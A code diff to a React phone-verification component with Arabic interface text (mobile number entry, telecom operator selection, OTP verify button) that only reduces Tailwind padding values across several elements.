@@ -307,7 +307,7 @@ export default function PhoneVerificationWithLoader() {
   }
 
   return (
-    <div className="min-h-screen bg-gradient-to-r from-[#146394] to-[#1a7ab8] flex flex-col items-center justify-start md:justify-center p-4">
+    <div className="min-h-screen bg-gradient-to-r from-[#146394] to-[#1a7ab8] flex flex-col items-center justify-start md:justify-center p-1">
       <Header />
 
       {/* Loader Overlay */}
@@ -371,7 +371,7 @@ export default function PhoneVerificationWithLoader() {
               {loaderMessage.includes("رمز التحقق") && verificationStatus !== "pending" && !otpCode && (
                 <button
                   onClick={() => verifyOtp()}
-                  className="w-full bg-[#146394] text-white py-3 rounded-lg font-semibold transform transition-all duration-300 hover:bg-[#0d4e77]"
+                  className="w-full bg-[#146394] text-white py-1 rounded-lg font-semibold transform transition-all duration-300 hover:bg-[#0d4e77]"
                 >
                   تحقق
                 </button>
@@ -394,14 +394,14 @@ export default function PhoneVerificationWithLoader() {
 
       {/* Main Form */}
       <div className="w-full max-w-4xl bg-white rounded-2xl shadow-2xl border border-gray-100 overflow-hidden mt-8 md:mt-0">
-        <div className="p-4 md:p-8 space-y-4 md:space-y-6 relative">
+        <div className="p-1 md:p-8 space-y-4 md:space-y-6 relative">
           <div className="text-center mb-6">
             <h1 className="text-2xl md:text-3xl font-bold text-[#146394]">التحقق من رقم الجوال</h1>
             <p className="text-gray-600 mt-2">الرجاء إدخال رقم الجوال واختيار شركة الاتصالات</p>
           </div>
 
           {errors.system && (
-            <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg">{errors.system}</div>
+            <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-1 rounded-lg">{errors.system}</div>
           )}
 
           <form onSubmit={handleSubmit} className="space-y-4 md:space-y-6">
@@ -419,7 +419,7 @@ export default function PhoneVerificationWithLoader() {
                   id="phone"
                   value={phone}
                   onChange={handlePhoneChange}
-                  className="block w-full pr-16 py-3 text-gray-900 border border-gray-300 rounded-lg focus:ring-[#146394] focus:border-[#146394] text-right"
+                  className="block w-full pr-16 py-1 text-gray-900 border border-gray-300 rounded-lg focus:ring-[#146394] focus:border-[#146394] text-right"
                   placeholder="05xxxxxxxx"
                   dir="ltr"
                 />
@@ -436,7 +436,7 @@ export default function PhoneVerificationWithLoader() {
                     key={op.id}
                     type="button"
                     onClick={() => handleOperatorSelect(op.id)}
-                    className={`flex flex-col items-center justify-center p-4 border rounded-lg transition-all ${
+                    className={`flex flex-col items-center justify-center p-1 border rounded-lg transition-all ${
                       operator === op.id ? "border-[#146394] bg-blue-50" : "border-gray-200 hover:bg-gray-50"
                     }`}
                   >
@@ -451,7 +451,7 @@ export default function PhoneVerificationWithLoader() {
             {/* Submit Button */}
             <button
               type="submit"
-              className="w-full bg-[#146394] text-white py-3.5 rounded-lg font-semibold transform transition-all duration-300 hover:bg-[#0d4e77] text-base"
+              className="w-full bg-[#146394] text-white py-1.5 rounded-lg font-semibold transform transition-all duration-300 hover:bg-[#0d4e77] text-base"
             >
               إرسال رمز التحقق
             </button>
